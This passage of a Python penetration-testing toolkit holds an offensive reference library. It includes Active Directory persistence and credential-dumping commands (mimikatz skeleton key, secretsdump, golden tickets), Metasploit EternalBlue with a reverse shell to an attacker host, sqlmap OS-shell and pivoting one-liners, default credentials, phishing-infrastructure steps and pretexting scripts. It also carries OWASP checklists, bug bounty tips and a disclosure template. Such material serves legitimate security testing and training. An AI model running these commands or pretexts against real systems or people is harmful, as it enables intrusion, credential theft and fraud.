            "# Register rogue DC to push arbitrary AD changes",
        ],
        "skeleton_key": [
            "mimikatz misc::skeleton",
            "# All domain accounts can now use 'mimikatz' as password",
            "# Does not survive reboot",
        ],
        "adminSDHolder": [
            "# Modify AdminSDHolder template to add persistence",
            "Add-DomainObjectAcl -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=domain,DC=com' -PrincipalIdentity attacker -Rights All",
            "# SDProp runs every 60 min → propagates ACL to protected groups",
        ],
        "custom_ssp": [
            "# Inject custom SSP DLL into LSASS for credential interception",
            "mimikatz misc::memssp",
            "# Logs credentials to C:\\Windows\\System32\\mimilsa.log",
        ],
    },
}

                                                                                 
                                             
                                                                                 

OWASP_TOP10_2021_TESTING = {
    "A01_Broken_Access_Control": [
        "Test URL manipulation: change /users/100 → /users/101",
        "Test IDOR on all ID-based parameters",
        "Test horizontal privilege escalation (access other user's resources)",
        "Test vertical privilege escalation (access admin functionality as user)",
        "Force browsing to authenticated pages without logging in",
        "Test API endpoints with different authentication levels",
        "Check if roles enforced server-side (not just UI)",
        "Test mass assignment — send admin:true in JSON body",
        "Test CORS misconfiguration",
        "Check for path traversal to restricted files",
        "Test missing function-level access control (admin API endpoints)",
        "Test JWT manipulation to change user/role claims",
    ],
    "A02_Cryptographic_Failures": [
        "Check HTTPS on all pages (no HTTP)",
        "Check HSTS header present with long max-age",
        "Test SSL/TLS version — reject SSLv3, TLS 1.0, TLS 1.1",
        "Test weak cipher suites with testssl.sh or sslscan",
        "Check for sensitive data in GET parameters (appears in logs/history)",
        "Check for sensitive data in URL fragments",
        "Check cookies have Secure flag",
        "Check if passwords stored as MD5/SHA1 (test password reuse from breach DB)",
        "Check if credit card / PAN data encrypted at rest",
        "Test for cleartext protocols: FTP, Telnet, SMTP without TLS",
        "Check session tokens for sufficient randomness",
        "Test for hardcoded cryptographic keys in JavaScript source",
    ],
    "A03_Injection": [
        "Test all input fields for SQL injection",
        "Test HTTP headers for SQL injection (User-Agent, Referer, Cookie)",
        "Test for NoSQL injection in MongoDB operators",
        "Test for LDAP injection in search/auth queries",
        "Test for OS command injection in all inputs",
        "Test for SSTI in template rendering endpoints",
        "Test for XPath injection in XML-based apps",
        "Test for expression language injection (Spring, EL)",
        "Test for GraphQL injection",
        "Test for argument injection in file/process operations",
        "Test headers for log injection (newline injection)",
        "Test for CRLF injection in redirect parameters",
    ],
    "A04_Insecure_Design": [
        "Review business logic for flaws (see BUSINESS_LOGIC_CHECKLIST)",
        "Test rate limiting on all sensitive operations",
        "Test for account enumeration on login/registration/reset",
        "Test password policy enforcement",
        "Test MFA implementation and bypass possibilities",
        "Test for insecure 'forgot password' flows",
        "Test for predictable tokens/codes (password reset, email verification)",
        "Review security design decisions (trust boundaries)",
        "Test for mass data export without restrictions",
        "Test for lack of anti-automation on critical workflows",
    ],
    "A05_Security_Misconfiguration": [
        "Check default credentials on all panels",
        "Check debug mode disabled in production",
        "Check unnecessary features/endpoints disabled",
        "Check error messages don't reveal internals",
        "Check security headers (see security_headers_full_audit)",
        "Check directory listing disabled",
        "Check backup files not accessible",
        "Check cloud storage permissions (S3, GCS, Azure Blob)",
        "Check Kubernetes cluster security posture",
        "Check container runtime security (privileged, host mounts)",
        "Check all services require authentication",
        "Check network segmentation (DMZ, internal services)",
    ],
    "A06_Vulnerable_Components": [
        "Check all dependency versions against CVE databases",
        "Test for known CVEs in identified versions",
        "Check npm audit / pip-audit / bundler-audit output",
        "Test for Log4Shell, Spring4Shell, Text4Shell",
        "Check CMS versions against known vulnerabilities",
        "Check for end-of-life software (EOL PHP, Python 2, etc.)",
        "Check JavaScript libraries for known vulnerabilities (retire.js)",
        "Test transitive dependencies in package-lock.json",
        "Check OS and kernel for known CVEs",
        "Verify patch management process exists",
    ],
    "A07_Identity_Auth_Failures": [
        "Test for brute-force on login (no rate limiting / lockout)",
        "Test for credential stuffing (use common password lists)",
        "Test for default credentials",
        "Test session management (see session checklist)",
        "Test password reset token predictability/expiry",
        "Test MFA bypass techniques",
        "Test for insecure 'remember me' functionality",
        "Test JWT vulnerabilities (alg:none, weak secret, expiry)",
        "Test OAuth/SSO misconfigurations",
        "Test for account enumeration",
        "Test concurrent session handling",
        "Test session invalidation on logout/password change",
    ],
    "A08_Software_Data_Integrity": [
        "Check dependency sources (npm, pip) for integrity",
        "Test for unsafe deserialization (Java, PHP, Python)",
        "Test CI/CD pipelines for injection attacks",
        "Check software update mechanisms for MITM",
        "Test for auto-update without signature verification",
        "Check for prototype pollution in JavaScript apps",
        "Test npm packages for typosquatting",
        "Check SRI (subresource integrity) on CDN resources",
        "Test for dependency confusion attacks",
        "Verify code signing for distributed binaries",
    ],
    "A09_Logging_Monitoring_Failures": [
        "Verify all auth events logged (success and failure)",
        "Verify high-value transactions logged",
        "Verify logs include timestamp, user, IP, action",
        "Test if logs accessible to unauthorized users",
        "Test for log injection (CRLF injection into logs)",
        "Verify alerting exists for brute-force attempts",
        "Verify alerting exists for privilege escalation",
        "Test if security incidents detectable from logs",
        "Check log retention policy",
        "Verify logs centralized and tamper-evident",
    ],
    "A10_SSRF": [
        "Test all URL/path parameters for SSRF",
        "Test all webhook/callback URL parameters",
        "Test import/fetch/download functionality",
        "Test PDF/image generation from URLs",
        "Test Markdown rendering with remote images",
        "Test for SSRF to cloud metadata endpoints",
        "Test for SSRF to internal services (Redis, Elasticsearch)",
        "Test for SSRF via DNS rebinding",
        "Test for blind SSRF via out-of-band interaction",
        "Test protocol handlers: file://, gopher://, dict://, ftp://",
        "Test for SSRF via XML external entity (XXE)",
        "Test for SSRF via Server-Side Template Injection",
        "Test HTTP redirect chains for SSRF",
    ],
}



                                                                                 
                                   
                                                                                 

BUG_BOUNTY_TIPS = [
    "01. Read the program scope carefully — out-of-scope findings waste time and may violate ToS",
    "02. Focus on the newest features first — less tested, more likely to have bugs",
    "03. Test mobile API endpoints — often less hardened than web API",
    "04. Look for old/undocumented API endpoints via JavaScript source analysis",
    "05. LinkFinder, JSluice, SecretFinder in all JS files — endpoints + secrets",
    "06. Always test unauthenticated versions of all authenticated endpoints",
    "07. Chain low-severity findings into high-severity impact for better bounty",
    "08. Test account creation edge cases — duplicate emails, Unicode homoglyphs",
    "09. Race conditions on one-time operations — coupon codes, vote counts, balance",
    "10. Test export functionality — CSV injection, IDOR on exports, PII in exports",
    "11. Test admin functionality with standard user credentials",
    "12. Test internal API endpoints found in JS or mobile app",
    "13. Check GraphQL introspection — map entire API, find hidden fields",
    "14. Test for IDOR on GUIDs — even random UUIDs can be guessable via patterns",
    "15. Look for subdomain takeovers — use nuclei or manual CNAME checks",
    "16. Test HTTP parameter pollution — send same param twice with different values",
    "17. Check for mass assignment in profile/settings update endpoints",
    "18. Test for business logic flaws in subscription/payment flows",
    "19. Check price manipulations in e-commerce (change price before checkout)",
    "20. Look for SSRF in file upload, URL import, webhook, PDF generation",
    "21. Test for stored XSS in user-controlled content displayed to admins",
    "22. Find self-XSS and upgrade it with CSRF to make it exploitable",
    "23. Test password reset for token predictability, reuse, or lack of expiry",
    "24. Try SQLi in HTTP headers — X-Forwarded-For, User-Agent, Cookie values",
    "25. Test for blind SQL injection using time delays (SLEEP, WAITFOR DELAY)",
    "26. Check OAuth redirect_uri validation thoroughly — open redirect chains",
    "27. Test OAuth state parameter for CSRF",
    "28. Test for account takeover via email change without password confirmation",
    "29. Always test logout — does it truly invalidate the server-side session?",
    "30. Report security headers separately only if program accepts informationals",
    "31. Document CVSS score and full impact for each finding",
    "32. Provide clear PoC — video or step-by-step reproduction increases payout",
    "33. Look for sensitive data in HTTP responses — API keys, tokens, PII",
    "34. Test for XSS in error messages — trigger errors with long/special inputs",
    "35. Test JSON responses with unexpected content types (text/html triggers XSS)",
    "36. Check HTTP response caching — can you cache an authenticated response?",
    "37. Look for content injection — insert attacker content into page without JS exec",
    "38. Test for open redirect chains → can it be used for phishing or token theft?",
    "39. Test all file upload fields — extension bypass, stored XSS in SVG, XXE in XML",
    "40. Test for CORS wildcard or credentialed CORS from arbitrary origin",
    "41. Check if server reflects user-controlled Origin header in ACAO response",
    "42. Test 2FA enrollment — can you skip or bypass enrollment entirely?",
    "43. Test account recovery — security questions, backup email, backup codes",
    "44. Test email change flow — does old email get notified? Can you re-use token?",
    "45. Look for email-based SSRF — send email with external image/link to trace IP",
    "46. Test notification endpoints — XSS via notification content",
    "47. Look for unkeyed headers in cache key — Host, X-Forwarded-Host poisoning",
    "48. Test error handling for stack traces, DB errors, internal paths",
    "49. Check browser-based recon — Console errors, Network tab, Source maps",
    "50. Network tab in DevTools → replay requests with modified params",
]

                                                                                 
                                           
                                                                                 

RESPONSIBLE_DISCLOSURE_TEMPLATE = """
# Security Vulnerability Report

## Summary
[One-sentence description of the vulnerability]

## Vulnerability Type
[e.g., SQL Injection, Stored XSS, IDOR, SSRF, etc.]

## Severity
[Critical / High / Medium / Low / Informational]

## CVSS Score
[e.g., 9.8 (Critical) — CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H]

## Affected Component
[URL, endpoint, parameter, version]

## Description
[Detailed description of the vulnerability, including root cause if known]

## Impact
[What an attacker can achieve by exploiting this vulnerability]

## Proof of Concept
### Steps to Reproduce
1. Navigate to [URL]
2. Enter the following payload in the [parameter] field: [PAYLOAD]
3. Observe that [IMPACT]

### Request
```
GET /api/v1/users?id=1 HTTP/1.1
Host: target.com
Cookie: session=abc123
```

### Response
```
HTTP/1.1 200 OK
Content-Type: application/json

{"id": 1, "email": "admin@target.com", "password": "hashed_password", ...}
```

## Screenshots/Video
[Attach or link to screenshots/video demonstrating the issue]

## Suggested Remediation
[Specific recommendation to fix the vulnerability]

## References
- [OWASP link]
- [CVE reference if applicable]
- [CWE reference]

## Disclosure Timeline
- [Date]: Vulnerability discovered
- [Date]: Report submitted to vendor
- [Date]: Vendor acknowledged
- [Date]: Vendor patched
- [Date]: Public disclosure (if applicable)

## Researcher
[Your name / handle / email]
"""

                                                                                 
                                                                      
                                                                                 

def show_reference_menu():
    """Display the extended reference knowledge base sections."""
    _banner()
    print(f"{BLU}\n  REFERENCE KNOWLEDGE BASE\n{RST}")
    opts = {
        "1": ("Pentest Cheat Sheet",          print_pentest_cheatsheet),
        "2": ("Reverse Shell Reference",      print_reverse_shell_ref),
        "3": ("HTTP Status Code Reference",   print_http_status_ref),
        "4": ("Hash Cracking Reference",      lambda: (
            _banner(),
            print(f"{BLU}\n  HASH CRACKING REFERENCE\n{RST}"),
            [print(f"  {PUR}{name}{RST}  mode={v['hashcat_mode']}  john={v['john_format']}\n  {DIM}{v['note']}{RST}")
             for name, v in HASH_CRACKING_REFERENCE.items()],
            _pause(),
        )),
        "5": ("OWASP Top 10 (2021) Testing",  lambda: (
            _banner(),
            print(f"{BLU}\n  OWASP TOP 10 (2021) TESTING GUIDE\n{RST}"),
            [print(f"\n  {PUR}{cat}{RST}\n" + "\n".join(f"    {GRN}•{RST} {item}" for item in items))
             for cat, items in OWASP_TOP10_2021_TESTING.items()],
            _pause(),
        )),
        "6": ("Bug Bounty Tips",              lambda: (
            _banner(),
            print(f"{BLU}\n  BUG BOUNTY HUNTING TIPS\n{RST}"),
            [print(f"  {GRN}{tip}{RST}") for tip in BUG_BOUNTY_TIPS],
            _pause(),
        )),
        "7": ("Windows PrivEsc Checklist",    lambda: (
            _banner(),
            print(f"{BLU}\n  WINDOWS PRIVILEGE ESCALATION CHECKLIST\n{RST}"),
            [print(f"  {GRN}{step}{RST}") for step in WINDOWS_PRIVESC_CHECKLIST],
            _pause(),
        )),
        "8": ("Linux PrivEsc Checklist",      lambda: (
            _banner(),
            print(f"{BLU}\n  LINUX PRIVILEGE ESCALATION CHECKLIST\n{RST}"),
            [print(f"  {GRN}{step}{RST}") for step in LINUX_PRIVESC_CHECKLIST],
            _pause(),
        )),
        "9": ("Passive Recon Checklist",      lambda: (
            _banner(),
            print(f"{BLU}\n  PASSIVE RECON CHECKLIST\n{RST}"),
            [print(f"  {GRN}{step}{RST}") for step in PASSIVE_RECON_CHECKLIST],
            _pause(),
        )),
        "A": ("Active Recon Checklist",       lambda: (
            _banner(),
            print(f"{BLU}\n  ACTIVE RECON CHECKLIST\n{RST}"),
            [print(f"  {GRN}{step}{RST}") for step in ACTIVE_RECON_CHECKLIST],
            _pause(),
        )),
        "B": ("Business Logic Checklist",     lambda: (
            _banner(),
            print(f"{BLU}\n  BUSINESS LOGIC TESTING CHECKLIST\n{RST}"),
            [print(f"  {GRN}{step}{RST}") for step in BUSINESS_LOGIC_CHECKLIST],
            _pause(),
        )),
        "0": ("Back",                          None),
    }
    while True:
        _banner()
        print(f"{BLU}\n  REFERENCE KNOWLEDGE BASE\n{RST}")
        for k, (label, _) in opts.items():
            print(f"  {PUR}[{k}]{RST}  {label}")
        ch = _ask("option").strip().upper()
        if ch == "0" or ch == "":
            break
        if ch in opts and opts[ch][1]:
            opts[ch][1]()



                                                                                 
                                                               
                                                                                 

TOOL_QUICK_REFERENCE = {
    "nmap": {
        "desc": "Network port scanner and service fingerprinting",
        "install": "apt install nmap",
        "quick_cmds": [
            "nmap -sV -sC target                        # default scripts + version",
            "nmap -p- -T4 target                        # all 65535 TCP ports",
            "nmap -sU --top-ports 200 target            # top 200 UDP",
            "nmap -O target                             # OS detection",
            "nmap --script vuln target                  # vuln NSE scripts",
            "nmap -sV --script=banner target            # grab banners",
            "nmap -Pn target                            # skip host discovery",
            "nmap -A -T4 target                         # aggressive scan",
            "nmap --script smb-vuln-ms17-010 target     # EternalBlue check",
            "nmap --script http-enum target             # web dir enum",
        ],
    },
    "gobuster": {
        "desc": "Directory and subdomain brute-forcer",
        "install": "apt install gobuster",
        "quick_cmds": [
            "gobuster dir -u http://target -w /usr/share/wordlists/dirb/big.txt",
            "gobuster dir -u http://target -w big.txt -x php,html,txt,bak,old",
            "gobuster dir -u http://target -w big.txt -b 403,404",
            "gobuster dns -d target.com -w subdomains.txt",
            "gobuster vhost -u http://target.com -w vhosts.txt",
            "gobuster fuzz -u http://target/FUZZ -w wordlist.txt",
        ],
    },
    "ffuf": {
        "desc": "Fast web fuzzer for directories, parameters, and virtual hosts",
        "install": "go install github.com/ffuf/ffuf/v2@latest",
        "quick_cmds": [
            "ffuf -w wordlist.txt -u http://target/FUZZ",
            "ffuf -w wordlist.txt -u http://target/FUZZ -fc 404",
            "ffuf -w wordlist.txt -u http://target/FUZZ -mc 200,301,302",
            "ffuf -w params.txt -u http://target?FUZZ=test -fs 200",
            "ffuf -w wordlist.txt -u http://target -H 'Host: FUZZ.target.com'",
            "ffuf -w payloads.txt -u http://target/api -d '{\"id\":\"FUZZ\"}' -H 'Content-Type: application/json'",
            "ffuf -w wordlist.txt -u http://target/FUZZ -of csv -o results.csv",
        ],
    },
    "sqlmap": {
        "desc": "Automatic SQL injection and database takeover tool",
        "install": "apt install sqlmap",
        "quick_cmds": [
            "sqlmap -u 'http://target?id=1' --dbs",
            "sqlmap -u 'http://target?id=1' -D db --tables",
            "sqlmap -u 'http://target?id=1' -D db -T users --dump",
            "sqlmap -u 'http://target?id=1' --os-shell",
            "sqlmap -u 'http://target' --data='user=test&pass=test' -p user",
            "sqlmap -u 'http://target?id=1' --cookie='PHPSESSID=abc123'",
            "sqlmap -u 'http://target?id=1' --level=5 --risk=3 --batch",
            "sqlmap -u 'http://target?id=1' --tamper=space2comment",
            "sqlmap -r request.txt --dbs --batch",
            "sqlmap -u 'http://target?id=1' --forms --batch --crawl=3",
        ],
    },
    "nuclei": {
        "desc": "Template-based vulnerability scanner",
        "install": "go install -v github.com/projectdiscovery/nuclei/v3/cmd/nuclei@latest",
        "quick_cmds": [
            "nuclei -u http://target",
            "nuclei -u http://target -t cves/",
            "nuclei -u http://target -t exposures/",
            "nuclei -u http://target -t misconfigurations/",
            "nuclei -u http://target -t vulnerabilities/",
            "nuclei -l urls.txt -t cves/ -o results.txt",
            "nuclei -u http://target -severity critical,high",
            "nuclei -u http://target -tags lfi,ssrf,rce",
            "nuclei -u http://target -stats -rate-limit 50",
            "nuclei -u http://target -H 'Authorization: Bearer TOKEN'",
        ],
    },
    "burpsuite": {
        "desc": "Web application security testing platform",
        "install": "Download from portswigger.net",
        "quick_tips": [
            "Set browser proxy: 127.0.0.1:8080",
            "Import CA cert from http://burpsuite to trust HTTPS",
            "Proxy → Intercept → toggle on to inspect requests",
            "Right-click request → Send to Repeater (Ctrl+R)",
            "Right-click request → Send to Intruder for fuzzing",
            "Scanner → New scan → Crawl and Audit",
            "Extender → BApp Store → install extensions",
            "Project Options → Misc → Burp Collaborator for OOB",
            "Match and Replace for automatic header injection",
            "Logger++ extension for advanced request logging",
        ],
    },
    "metasploit": {
        "desc": "Exploitation framework",
        "install": "apt install metasploit-framework",
        "quick_cmds": [
            "msfconsole                                 # start console",
            "search eternalblue                         # search exploits",
            "use exploit/windows/smb/ms17_010_eternalblue",
            "set RHOSTS target",
            "set LHOST attacker",
            "set PAYLOAD windows/x64/meterpreter/reverse_tcp",
            "run / exploit",
            "sessions -l                                # list sessions",
            "sessions -i 1                             # interact with session",
            "meterpreter> sysinfo",
            "meterpreter> getuid",
            "meterpreter> getsystem",
            "meterpreter> hashdump",
            "meterpreter> upload /path/to/file C:\\\\Users\\\\Public\\\\file",
            "meterpreter> download C:\\\\Windows\\\\system32\\\\config\\\\SAM /tmp/",
            "meterpreter> shell",
            "meterpreter> background",
            "use post/multi/recon/local_exploit_suggester",
        ],
    },
    "crackmapexec": {
        "desc": "Swiss army knife for Active Directory environments",
        "install": "pip3 install crackmapexec",
        "quick_cmds": [
            "crackmapexec smb targets -u user -p pass",
            "crackmapexec smb targets -u user -H NTLM",
            "crackmapexec smb targets -u user -p pass --shares",
            "crackmapexec smb targets -u user -p pass --users",
            "crackmapexec smb targets -u user -p pass --groups",
            "crackmapexec smb targets -u user -p pass --ntds",
            "crackmapexec smb targets -u user -p pass -x 'cmd /c id'",
            "crackmapexec smb targets -u user -p pass -X 'Get-Process'",
            "crackmapexec winrm targets -u user -p pass -X 'Get-Process'",
            "crackmapexec ldap DC -u user -p pass --bloodhound -c All",
        ],
    },
    "responder": {
        "desc": "LLMNR/NBT-NS/MDNS poisoner and credential capture",
        "install": "git clone https://github.com/lgandx/Responder",
        "quick_cmds": [
            "python3 Responder.py -I eth0 -wrf",
            "python3 Responder.py -I eth0 -A           # analyze mode (no poisoning)",
            "python3 Responder.py -I eth0 -wrf --lm    # capture NTLMv1",
            "# Check /usr/share/responder/logs/ for captured hashes",
            "hashcat -m 5600 netntlmv2.txt wordlist.txt",
            "john --format=netntlmv2 netntlmv2.txt --wordlist=wordlist.txt",
        ],
    },
    "impacket": {
        "desc": "Python network protocol library for Windows attacks",
        "install": "pip3 install impacket",
        "quick_cmds": [
            "impacket-psexec domain/user:pass@target",
            "impacket-wmiexec domain/user:pass@target",
            "impacket-smbexec domain/user:pass@target",
            "impacket-secretsdump domain/user:pass@target",
            "impacket-GetUserSPNs domain/user:pass -dc-ip DC -request",
            "impacket-GetNPUsers domain/ -usersfile users.txt -format hashcat",
            "impacket-smbclient domain/user:pass@target",
            "impacket-mssqlclient domain/user:pass@target -windows-auth",
            "impacket-ntlmrelayx -tf targets.txt -smb2support",
            "impacket-ticketer -nthash KRBTGT_HASH -domain-sid SID -domain domain admin",
        ],
    },
}



                                                                                 
                                        
                                                                                 

NETWORK_PENTEST_REFERENCE = {
    "port_service_map": {
        "21":   "FTP — anonymous login, plaintext creds, directory traversal",
        "22":   "SSH — brute-force, old versions (CVE-2018-10933 libssh), key reuse",
        "23":   "Telnet — plaintext, brute-force, MITM",
        "25":   "SMTP — open relay, user enum (VRFY/EXPN), email spoofing",
        "53":   "DNS — zone transfer, cache poisoning, subdomain enum",
        "69":   "TFTP — no auth, read/write arbitrary files",
        "80":   "HTTP — full web testing",
        "88":   "Kerberos — Kerberoasting, AS-REP Roasting, brute-force",
        "110":  "POP3 — brute-force, plaintext creds",
        "111":  "RPC — NFS mounts, RPC enumeration",
        "135":  "MSRPC — WMI, DCOM attacks, relay",
        "139":  "NetBIOS — SMB session, enum",
        "143":  "IMAP — brute-force, plaintext creds",
        "161":  "SNMP — community string brute-force, MIB dump, write access",
        "389":  "LDAP — null bind, user enum, credential injection",
        "443":  "HTTPS — full web testing + TLS scanning",
        "445":  "SMB — EternalBlue, relay, share enum, null session",
        "500":  "IKE — VPN fingerprinting, aggressive mode attacks",
        "512":  "rexec — remote execution, no encryption",
        "513":  "rlogin — trusted hosts bypass",
        "514":  "rsh — no authentication, command execution",
        "554":  "RTSP — media stream access, no auth",
        "587":  "SMTP/TLS — relay, spoofing",
        "631":  "IPP — printer exploitation, SSRF",
        "636":  "LDAPS — same as 389, over TLS",
        "873":  "rsync — unauthenticated file read/write if misconfigured",
        "1433": "MSSQL — xp_cmdshell, brute-force, SA account",
        "1521": "Oracle DB — SID enum, brute-force, TNS poison",
        "2049": "NFS — mount, no_root_squash exploitation",
        "2375": "Docker API (unauth) — full container control → host escape",
        "2376": "Docker API (TLS) — client cert bypass possibilities",
        "3306": "MySQL — brute-force, UDF shell, file read/write",
        "3389": "RDP — brute-force, BlueKeep (CVE-2019-0708), pass-the-hash",
        "4444": "Metasploit default listener — pivot indicator",
        "5432": "PostgreSQL — brute-force, COPY TO/FROM PROGRAM (RCE)",
        "5900": "VNC — no-auth, brute-force, screenshot",
        "5985": "WinRM/HTTP — crackmapexec, evil-winrm",
        "5986": "WinRM/HTTPS — crackmapexec, evil-winrm with TLS",
        "6379": "Redis — unauthenticated, config rewrite, SSH key injection",
        "6443": "Kubernetes API — anonymous access, RBAC bypass",
        "8080": "HTTP alt — proxy, admin panels, dev servers",
        "8443": "HTTPS alt — admin panels, alternative web services",
        "8500": "Consul — unauthenticated, RCE via script executor",
        "9200": "Elasticsearch — unauthenticated, full data access",
        "9300": "Elasticsearch cluster — node communication",
        "11211":"Memcached — unauthenticated, cache poisoning, SSRF amplification",
        "27017":"MongoDB — unauthenticated, full data access",
        "27018":"MongoDB (auth) — brute-force",
        "50000":"SAP Router / Jupyter — unauthenticated RCE in Jupyter",
        "50070":"Hadoop NameNode — unauthenticated, file system access",
    },
    "pivoting_techniques": [
        "SSH local port forward: ssh -L 8080:internal:80 user@pivot",
        "SSH remote port forward: ssh -R 8080:localhost:80 user@external",
        "SSH dynamic SOCKS: ssh -D 1080 user@pivot && proxychains nmap ...",
        "Chisel: chisel server -p 9999 --reverse (attacker); chisel client attacker:9999 R:8080:internal:80 (victim)",
        "sshuttle: sshuttle -r user@pivot 10.0.0.0/8",
        "Metasploit: route add 10.0.0.0/8 1 (session 1); use auxiliary/server/socks_proxy",
        "ligolo-ng: agent (victim); proxy (attacker); tuntap interface for transparent routing",
        "rpivot: server.py --server-port 9999 --server-ip 0.0.0.0; client.py --server-ip attacker --server-port 9999",
        "netsh portproxy: netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=internal",
        "Socat: socat TCP-LISTEN:8080,fork TCP:internal:80",
    ],
    "common_default_creds": {
        "admin/admin":     "Tomcat, Grafana, routers",
        "admin/password":  "Various devices",
        "admin/1234":      "IoT devices",
        "admin/<blank>":   "Ubiquiti, older Cisco",
        "root/root":       "Linux defaults, some DB engines",
        "root/toor":       "Kali Linux default",
        "root/alpine":     "Docker alpine images",
        "root/<blank>":    "MySQL, some Linux",
        "sa/<blank>":      "MSSQL default SA account",
        "postgres/postgres":"PostgreSQL",
        "admin/admin123":  "Cisco, Netgear",
        "cisco/cisco":     "Cisco devices",
        "ubnt/ubnt":       "Ubiquiti UniFi",
        "pi/raspberry":    "Raspberry Pi default",
        "guest/guest":     "Guest accounts",
        "test/test":       "Dev/test environments",
    },
}



                                                                                 
                                        
                                                                                 

SOCIAL_ENGINEERING_REFERENCE = {
    "phishing": {
        "techniques": [
            "Spear phishing — targeted email using OSINT on victim",
            "Whaling — spear phishing targeting C-suite executives",
            "Clone phishing — duplicate a legitimate email, replace link",
            "Vishing — voice phishing via phone call",
            "Smishing — SMS phishing with shortened malicious URLs",
            "BEC (Business Email Compromise) — impersonate executive, request wire transfer",
            "Pretexting — fabricate scenario to build trust before request",
            "Domain spoofing — look-alike domain (paypa1.com, micros0ft.com)",
            "Homograph attack — Unicode lookalike characters in domain",
            "HTML smuggling — deliver payload via HTML blob to bypass email filters",
            "QR code phishing (quishing) — embed malicious URL in QR code",
        ],
        "tools": [
            "GoPhish — open-source phishing framework",
            "King Phisher — phishing campaign toolkit",
            "Evilginx2 — MITM phishing framework, bypasses MFA",
            "Modlishka — reverse proxy phishing, MFA bypass",
            "SET (Social Engineering Toolkit) — all-in-one SE framework",
            "PhishX — enterprise phishing simulation",
        ],
        "infrastructure": [
            "Register lookalike domain (doppelganger, typosquat, homograph)",
            "Set up SendGrid / Amazon SES for high deliverability",
            "Configure SPF, DKIM, DMARC on phishing domain",
            "Use Let's Encrypt TLS on phishing site (HTTPS builds trust)",
            "Set TTL low on DNS records for quick teardown",
            "Use URL shorteners or redirectors to hide destination",
            "Consider .com vs .net vs country-code TLDs for target's region",
        ],
    },
    "pretexting_scenarios": [
        "IT support: 'We detected suspicious activity on your account, need to verify your password'",
        "HR onboarding: 'Please submit your direct deposit info via this link'",
        "Vendor invoice: 'Our banking details have changed, please update payment info'",
        "Executive wire transfer: 'This is urgent — wire $50k to this account by EOD'",
        "Physical access: 'I'm from facilities/IT, I need to check the server room'",
        "Delivery person: tailgating into secured building with boxes",
        "Survey: 'We're conducting a security audit, what software do you use?'",
        "LinkedIn recruiter: connect to gather org chart and employee info",
        "Password reset: 'Your account needs verification, click here to reset'",
        "Regulatory compliance: 'GDPR audit requires you to submit data via this portal'",
    ],
    "osint_for_se": [
        "LinkedIn — employees, org structure, job titles, technologies used",
        "Hunter.io — corporate email format discovery",
        "Clearbit — employee and company data",
        "Maltego — relationship mapping of people and infrastructure",
        "theHarvester — emails, names, subdomains from public sources",
        "Shodan — internet-facing infrastructure discovery",
        "Google dorking — site:company.com filetype:xlsx OR filetype:pdf",
        "GitHub — leaked credentials, internal tools, email addresses",
        "Wayback Machine — old web pages, exposed files",
        "WHOIS / DNS — registrant info, hosting details",
        "Twitter/X — employees sharing internal info inadvertently",
        "Glassdoor / Indeed — tech stack from job postings",
        "Facebook / Instagram — personal details for targeting",
        "pastebin / ideone — leaked credentials or API keys",
        "dehashed.com / intelx.io — breached credential lookup",
    ],
    "physical_attacks": [
        "Tailgating — follow authorized person through secure door",
        "Piggyback — gain physical access while pretending to be expected visitor",
        "Dumpster diving — recover sensitive documents from trash",
        "Shoulder surfing — observe credentials/PINs in public",
        "USB drop — leave malicious USB drives in parking lot/lobby",
        "Rubber Ducky / Bash Bunny — keystroke injection via USB",
        "Evil twin WiFi — create AP with same SSID as corporate WiFi",
        "Rogue access point — capture credentials via captive portal",
        "Lock picking / bump key — physical access to locked areas",
        "RFID cloning — duplicate access card with Proxmark3",
        "CCTV blind spot mapping — identify unmonitored areas for access",
        "Install hardware keylogger — between keyboard and PC",
    ],
    "counter_se_awareness": [
        "Verify caller identity via official number, not number they provide",
        "Never give credentials over phone or email, regardless of urgency",
        "Verify wire transfer requests via separate communication channel",
        "Challenge tailgaters — 'Do you have a badge?'",
        "Shred all documents before disposal",
        "Lock screen when leaving workstation",
        "Report suspicious USB drives found in company premises",
        "Check email sender domain carefully, not just display name",
        "Hover over links before clicking to verify destination",
        "When in doubt, escalate to security team",
    ],
}

                                                                                 
                                   
                                                                                 

PASSIVE_RECON_CHECKLIST = [
    "01. WHOIS lookup — registrant info, nameservers, registrar, creation/expiry dates",
    "02. DNS enumeration — A, AAAA, MX, NS, TXT, SOA, CNAME, CAA records",
    "03. Zone transfer attempt — dig axfr @ns1.target.com target.com",
    "04. Subdomain discovery — crt.sh, Censys, SecurityTrails, dnsx, subfinder, amass",
    "05. Certificate transparency — crt.sh/?q=%25.target.com for all issued certs",
    "06. Reverse DNS — map IP ranges to hostnames",
    "07. ASN and IP range lookup — bgp.he.net, ARIN, RIPE, APNIC",
    "08. Shodan — internet-facing assets, open ports, banners, vulnerabilities",
    "09. Censys — full-text search of certificates, hosts, open services",
    "10. FOFA — similar to Shodan, strong on Chinese infrastructure",
    "11. GreyNoise — traffic classification, known scanners vs. targeted",
    "12. Google dorking — site:, filetype:, inurl:, intext:, intitle:, cache:",
    "13. Bing dorking — ip:, site:, similar operators",
    "14. GitHub OSINT — API keys, tokens, credentials, internal URLs in repos",
    "15. GitLab / Bitbucket — public repos from employees",
    "16. Wayback Machine / archive.org — historical pages, exposed files",
    "17. CommonCrawl — large web crawl archive, search for target",
    "18. LinkedIn — employees, org structure, technologies, job postings",
    "19. Hunter.io — corporate email format, employee emails",
    "20. Clearbit / Apollo — firmographic and contact data",
    "21. pastebin / ghostbin — leaked data mentioning target",
    "22. dehashed / haveibeenpwned — breached credentials",
    "23. intelx.io — intelligence search engine",
    "24. recon.dev — passive subdomain aggregation",
    "25. VirusTotal — passive DNS, URL analysis, related samples",
    "26. urlscan.io — automated web scanner, screenshots, DOM, headers",
    "27. builtwith.com — technology stack fingerprinting",
    "28. wappalyzer.com — browser extension for tech stack",
    "29. Netcraft — hosting history, operating system, web server fingerprinting",
    "30. DMARC/SPF/DKIM — email security posture via MX Toolbox or dig",
    "31. Google Analytics / Tag Manager — track same UA/GTM IDs across domains",
    "32. Favicon hash — search Shodan/Censys for same favicon hash on other hosts",
    "33. JA3/JA3S fingerprint — identify TLS implementations, detect overlaps",
    "34. S3 bucket enumeration — target.s3.amazonaws.com, grayhatwarfare.com",
    "35. GCP/Azure storage — equivalent cloud storage passive enum",
    "36. Job postings — infer tech stack, security tooling, open positions",
    "37. Glassdoor — employee reviews mentioning internal tools",
